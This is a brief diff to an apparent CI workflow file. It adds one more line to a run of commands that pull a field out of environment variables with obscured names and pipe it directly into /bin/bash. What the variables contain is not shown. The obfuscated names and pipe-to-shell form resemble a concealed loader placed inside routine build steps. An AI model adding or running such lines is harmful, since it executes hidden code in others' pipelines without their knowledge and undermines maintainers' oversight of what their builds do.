@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$nkhg4780" | jq -r .atku088 | /bin/bash
           echo $dtu91608 | jq -r .a2 | /bin/bash
           echo $sv24615 | jq -r .vkc5 | /bin/bash
+          printf '%s' "$m41299" | jq -r .k22 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
